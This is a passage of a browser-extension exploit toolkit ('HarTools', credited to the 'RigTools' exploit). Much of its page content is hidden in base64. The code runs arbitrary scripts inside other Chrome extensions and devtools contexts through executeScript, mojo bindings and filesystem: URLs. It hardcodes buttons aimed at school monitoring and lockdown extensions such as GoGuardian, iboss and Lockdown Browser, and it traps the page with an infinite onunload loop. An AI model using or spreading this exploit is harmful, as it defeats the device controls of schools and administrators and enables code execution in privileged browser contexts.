QuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3JjID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9ib29tLmF3ZWJwIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUudG9wID0gIjAiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmxlZnQgPSAiMCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZXhwbG9zaW9uSW1hZ2UpOwoKICAgICAgICBjb25zdCBleHBsb2RlID0gbmV3IEF1ZGlvKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvYm9vbS5tcDMiKTsKCiAgICAgICAgY29uc3QgY2F0c011c2ljID0gbmV3IEF1ZGlvKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvY2F0cy5tcDMiKTsKICAgICAgICBjYXRzTXVzaWMubG9vcCA9IHRydWU7CgogICAgICAgIGZ1bmN0aW9uIHNob3dFeHBsb3Npb25BbmRQbGF5TXVzaWMoKSB7CgogICAgICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsKCiAgICAgICAgICAgIGV4cGxvZGUucGxheSgpOwogICAgICAgICAgICBjYXRzTXVzaWMucGxheSgpOwoKICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgICAgICAgICAgIH0sIDE1MDApOwoKICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGV4cGxvZGUucGF1c2UoKTsKICAgICAgICAgICAgICAgIGV4cGxvZGUuY3VycmVudFRpbWUgPSAwOwogICAgICAgICAgICB9LCAxNTAwKTsKICAgICAgICB9CgogICAgICAgIHNob3dFeHBsb3Npb25BbmRQbGF5TXVzaWMoKTsKCiAgICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmIChvblRhYikgewogICAgICAgIGNvZGUgPSBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0ID8KICAgICAgICAgICAgYDtjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KAogICAgICAgICAgJHt0YWJJZH0sCiAgICAgICAgICB7IGNvZGU6ICR7SlNPTi5zdHJpbmdpZnkoY29kZSl9IH0KICAgICAgICApYCA6CiAgICAgICAgICAgIGNocm9tZS5zY3JpcHRpbmcgPwogICAgICAgICAgICBgY2hyb21lLnNjcmlwdGluZy5leGVjdXRlU2NyaXB0KHsKICAgICAgICAgIHRhcmdldDoge3RhYklkOiAke3RhYklkfX0sCiAgICAgICAgICBmdW5jOiAoKSA9PiB7JHtjb2RlfX0KICAgICAgICB9KTtgIDoKICAgICAgICAgICAgYGFsZXJ0KCJzb21ldGhpbmcgd2VudCB3cm9uZywgcnVuQ29kZSB3YXMgZXhlY3V0ZWQgb24gYSB0YWIgd2l0aG91dCBwcm9wZXIgcGVybWlzc2lvbnMiKWA7CiAgICB9CgogICAgdHJ5IHsKICAgICAgICBjb25zdCBvcmlnaW5hbExvZyA9IGNvbnNvbGUubG9nOwogICAgICAgIGNvbnNvbGUubG9nID0gKC4uLmFyZ3MpID0+IHsKICAgICAgICAgICAgb3V0cHV0RGl2LmlubmVySFRNTCArPSBhcmdzLmpvaW4oIiAiKSArICI8YnI+IjsKICAgICAgICB9OwoKICAgICAgICBjb25zdCBmcyA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZ2V0RlMoKTsKCiAgICAgICAgZnVuY3Rpb24gd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgic3JjLmpzIiwgY29kZSk7CiAgICAgICAgbGV0IHNjcmlwdCA9CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V2YWx1YXRlX2VsZW0iKSA/PwogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQucmVtb3ZlKCk7CiAgICAgICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LmlkID0gImV2YWx1YXRlX2VsZW0iOwogICAgICAgIHNjcmlwdC5zcmMgPSB1cmw7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwoKICAgICAgICBjb25zb2xlLmxvZyA9IG9yaWdpbmFsTG9nOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBvdXRwdXREaXYuaW5uZXJIVE1MID0gYEVycm9yOiAke2Vycm9yfWA7CiAgICB9Cn07Cg==`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4=')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);
            
            }
            document.open();
            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html
            document.write(atob(`PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICA8dGl0bGU+RGFzaGJvYXJkPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjAyMTI0OwogICAgICAgIGNvbG9yOiAjZThlYWVkOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgbWF4LXdpZHRoOiA5MDBweDsKICAgICAgICBtYXJnaW46IDUwcHggYXV0bzsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMmIyYjJiOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICAgICAgcGFkZGluZzogMzBweDsKICAgICAgICBib3gtc2hhZG93OiAwIDFweCAzcHggcmdiYSgwLCAwLCAwLCAwLjUpOwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMzYzQwNDM7CiAgICAgICAgdHJhbnNpdGlvbjogYm94LXNoYWRvdyAwLjNzIGVhc2UsIGJvcmRlci1jb2xvciAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5tYWluOmhvdmVyIHsKICBib3gtc2hhZG93OiAwIDAgMTBweCAycHggIzhhMmJlMiwgMCAwIDIwcHggNHB4ICM4YTJiZTI7CiAgYm9yZGVyLWNvbG9yOiAjOGEyYmUyOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICB9CgogICAgICAubG9nbyB7CiAgICAgICAgd2lkdGg6IDMuNWVtOwogICAgICAgIGhlaWdodDogYXV0bzsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICB9CgogICAgICBoMSB7CiAgICAgICAgZm9udC1zaXplOiAyLjJlbTsKICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgY29sb3I6ICNiYjg2ZmM7CiAgICAgIH0KCiAgICAgIHAgewogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBsaW5lLWhlaWdodDogMS42OwogICAgICAgIGNvbG9yOiAjZGFkY2UwOwogICAgICB9CgogICAgICBhIHsKICAgICAgICBjb2xvcjogI2JiODZmYzsKICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICBwYWRkaW5nOiA4cHggMTRweDsKICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgbWFyZ2luOiA2cHggNHB4OwogICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjJzIGVhc2U7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICB9CgogICAgICAuYnV0dG9uOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjYTA2NmY1OwogICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMS4wNSk7CiAgICAgIH0KCiAgICAgIC5idXR0b246Zm9jdXMgewogICAgICAgIG91dGxpbmU6IG5vbmU7CiAgICAgIH0KCiAgICAgIGlucHV0LAogICAgICBzZWxlY3QsCiAgICAgIHRleHRhcmVhIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzAzMTM0OwogICAgICAgIGNvbG9yOiAjZThlYWVkOwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICM1ZjYzNjg7CiAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTVweDsKICAgICAgfQoKICAgICAgaW5wdXQ6Zm9jdXMsCiAgICAgIHNlbGVjdDpmb2N1cywKICAgICAgdGV4dGFyZWE6Zm9jdXMgewogICAgICAgIGJvcmRlci1jb2xvcjogI2JiODZmYzsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICA6OnBsYWNlaG9sZGVyIHsKICAgICAgICBjb2xvcjogIzlhYTBhNjsKICAgICAgfQoKICAgICAgaHIgewogICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICBib3JkZXItdG9wOiAxcHggc29saWQgIzNjNDA0MzsKICAgICAgICBtYXJnaW46IDIwcHggMDsKICAgICAgfQoKICAgICAgLmJhY2tncm91bmQtZ3JpZCB7CiAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgIHRvcDogMDsKICAgICAgICBsZWZ0OiAwOwogICAgICAgIHJpZ2h0OiAwOwogICAgICAgIGJvdHRvbTogMDsKICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiByYWRpYWwtZ3JhZGllbnQoIzMwMzEzNCAxcHgsIHRyYW5zcGFyZW50IDFweCk7CiAgICAgICAgYmFja2dyb3VuZC1zaXplOiAycmVtIDJyZW07CiAgICAgICAgei1pbmRleDogLTE7CiAgICAgICAgYW5pbWF0aW9uOiBtb3ZlR3JpZCA0cyBsaW5lYXIgaW5maW5pdGU7CiAgICAgIH0KCiAgICAgIEBrZXlmcmFtZXMgbW92ZUdyaWQgewogICAgICAgIDAlIHsKICAgICAgICAgIGJhY2tncm91bmQtcG9zaXRpb246IDAgMDsKICAgICAgICB9CiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KICAgICAgICBpZnJhbWUgewogICAgICAgICAgICB3aWR0aDogMDsKICAgICAgICAgICAgaGVpZ2h0OiAwOwogICAgICAgICAgICBib3JkZXI6IDA7CiAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbjsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICBsZWZ0OiAtOTk5OXB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPGRpdiBjbGFzcz0iYmFja2dyb3VuZC1ncmlkIj48L2Rpdj4KICAgIDxkaXYgY2xhc3M9Im1haW4iPgogICAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgICAgIDxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzL3JlZnMvaGVhZHMvbWFpbi9oYXJ0b29scy5naWYiIGFsdD0iSGFyVG9vbHMgTG9nbyIgY2xhc3M9ImxvZ28iIC8+CiAgICAgICAgPGgxPkhhclRvb2xzPC9oMT4KICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPgogICAgICBPcmlnaW5hbCBSaWdUb29scyBFeHBsb2l0IHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vRldTbWFzaGVyIj5GV1NtYXNoZXI8L2E+PC9wPgogICAgICA8aHI+CiAgICAgIDxwPkFLQTogaWYgc29tZW9uZSB0ZWxscyB5b3UgdGhhdCB0aGV5IG1hZGUgdGhpcywgdGhleSdyZSBseWluZyBhbmQgeW91IHNob3VsZCBsYXVnaCBhdCB0aGVtPC9wPgogICAgICA8aHI+CiAgICAgIDxwPkFkZGl0aW9uYWwgY3JlZGl0czogRGlzY29yZDogQGF4cW14ICh0ZXN0aW5nIGFuZCBoZWxwaW5nIHdpdGggZGV2ZWxvcG1lbnQpIEBwd2VuIChpZGVhcykgfCBHaXRodWI6CiAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiwKICAgICAgICA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vQmxvYmJ5LUJvaSI+QmxvYmJ5IEJvaTwvYT4KICAgICAgPC9wPgogICAgICA8aHI+CgogICAgICA8cD5QcmVzcyBRIGZvciBldmFsdWF0aW5nIGNvZGUgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImV4dGRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5leHRlbnNpb24gaWQ8L2E+PC9wPgogICAgICA8cD5PciBwcmVzcyAxLTkgZm9yIHNvbWUgaGFyZGNvZGVkIGV4dGVuc2lvbnM8L3A+CiAgICAgIDxwPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImFka2Nwa3BnaGFobWJvcGtqY2hvYmllY2tlb2FvZWVtIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGZpbHRlcjwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJocGtkb2tha2pnbHBwZWVrZmVla21lYmZhaGFkbmZscCIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5scyBhbGVydDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJoYWxkbGdsZHBsZ25nZ2tqYWFmaGVsZ2lhZ2xhZmFuaCIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nb2d1YXJkaWFuPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1vZWhrYmJjYmtsbWtjamliY2Jib29lYmdwb2dlam9jIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmFyaXN0b3RsZTwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJrbWZmZWhiaWRsYWxpYmZla2xhZWZuY2twaWRib2RmZiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5pYm9zczwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJtbG9hamZubWpja2ZqYmVlb2ZjZGFlY2JlbG5ibGRlbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5zbmFwJnJlYWQ8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iZm9namVhbmpmYmlvbWJnaG5ta21tb3BoZmVjY2pka2kiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bG9ja2Rvd24gYnJvd3NlcjwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJrbXBqbGlsbmVtamNpb2hqY2tqYWRtZ21pY29sZGdsZiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5keWtub3cgY2xvdWQ8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iZ25kbWhkY2VmYmhsY2hraGlwY25uYmtjbWljbmNlaGsiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+Z2Zvcm1zIGxvY2tlZCBtb2RlIChlbnJvbGxlZCBjYnMpPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imlub2Vvbm1mYXBqYmJrbWRhZm9hbmtrZmFqa2NwaGdkIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnJlYWQgYW5kIHdyaXRlPC9hPgogICAgICA8L3A+CgogICAgICA8cD5QcmVzcyBNIGZvciBldmFsdWF0aW5nIHVuZGVyIDxhIGNsYXNzPSJidXR0b24iIGlkPSJkZXZkYmciIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+ZGV2dG9vbHM8L2E+IGNvbnRleHQ8L3A+CiAgICAgIDxwPlR5cGluZyBjYW5jZWwgaW4gYW55IHByb21wdCB3aWxsIGNhbmNlbCB0aGUgY3VycmVudCBvcGVyYXRpb24uPC9wPgoKICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iZGV2dG9vbHM6Ly9kZXZ0b29scy9idW5kbGVkL2luc3BlY3Rvci5odG1sP2V4cGVyaW1lbnRzPXRydWUiPlJlLW9wZW4gZGV2dG9vbHM8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9InVwZGF0ZXIiPlVwZGF0ZSBwYXlsb2FkPC9hPgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJjbGVhbnVwIj5DbGVhbnVwIGFuZCByZXNldCBmb3IgZXh0ZW5zaW9uPC9hPgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJhY3RpdmF0ZSI+Q2hyb21lIFVSTHM8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlMiI+Q2hyb21lIFVSTHMgMjwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idHJvbGwiPkluamVjdCBUcjNuY2ggaW50byBleHRlbnNpb248L2E+CiAgICA8L2Rpdj4KCiAgICA8c2NyaXB0IGRlZmVyPgogICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAgICAgICBpZiAoZXZlbnQua2V5ID09PSAicSIpIHsKICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJleHRkYmciKS5jbGljaygpOwogICAgICAgIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAibSIpIHsKICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkZXZkYmciKS5jbGljaygpOwogICAgICAgIH0gZWxzZSBpZiAoWyIxIiwgIjIiLCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSJdLmluY2x1ZGVzKGV2ZW50LmtleSkpIHsKICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoYC5oYXJkY29kZWRgKVtwYXJzZUludChldmVudC5rZXkpIC0gMV0/LmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
